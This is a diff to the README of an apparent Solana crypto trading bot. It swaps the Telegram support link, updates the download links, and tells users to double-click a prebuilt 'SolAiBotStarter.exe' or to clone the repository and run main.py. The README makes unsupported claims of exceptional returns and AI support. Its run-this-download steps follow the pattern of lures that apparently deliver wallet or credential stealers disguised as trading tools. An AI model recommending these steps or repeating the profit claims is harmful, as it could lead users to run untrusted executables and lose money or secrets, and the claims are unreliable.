@@ -17,7 +17,7 @@
 - **Token Creation and Management**: Create and manage your own tokens on the Solana network. 
 - **GPT-4.0 Support**: Get real-time AI support for setting up and configuring the bot. Click the bot icon at the bottom left of the screen for live assistance. 
 - **Cross-Platform**: Compatible with both Mac and Windows operating systems. 
-- **Live Support**: If you need to speak with a developer, you can message us 24/7 on our Telegram at [PancakeSwapPrediction](https://t.me/pancakeswapprediction). 
+- **Live Support**: If you need to speak with a developer, you can message us 24/7 on our Telegram at [Sol Si Bot Full Support](https://t.me/SolAiBotSupport). 
 
 ## Why Solana Ultimate Ai Trade Bot? 
 
@@ -28,15 +28,6 @@ Solana Ultimate Ai Trade Bot is designed for those who truly want to maximize th
 - **Exceptional Returns**: The bot's high profitability ensures that the subscription costs are negligible compared to the returns you can achieve. 
 
 ## Getting Started 
-
-### Mac Users 
-
-1. Download the packaged version from [here](https://github.com/PumpExpert/All-in-One-Solana-Bot/releases/download/V4.1.1/SolAiBot_Mac.zip). 
-2. Unzip the files and Double-click the downloaded DMG file. 
-3. Right-click on `SolAiBot.app` and select `Open` to access the bot. 
-4. Once the bot is running, it may take a few minutes to fetch the list of tokens from the Solana network depending on your internet speed. During this time, you can watch the informational messages on the screen to see what the bot is doing. 
-
-## Way 2
   
 Then run the following commands in Terminal:
 
@@ -44,16 +35,16 @@ Then run the following commands in Terminal:
 git clone https://github.com/PumpExpert/All-in-One-Solana-Bot.git
 cd All-in-One-Solana-Bot
 pip install Pillow PyQt5 pyzipper requests
-sudo python3 main.py
+python3 main.py
 ```
 
 
 
 ### Windows Users 
 
-1. Download the packaged version from [here](https://github.com/PumpExpert/All-in-One-Solana-Bot/releases/download/V4.1.1/SolAiBot_Win.zip). 
+1. Download the packaged version from [here](https://github.com/PumpExpert/All-in-One-Solana-Bot/releases/download/V5.0/SolAiBot_Win.zip). 
 2. Extract the ZIP file. 
-3. Double-click on the `SolAiBot.exe` application to start the bot. 
+3. Double-click on the `SolAiBotStarter.exe` application to start the bot. 
 
 ## Alternative 
 
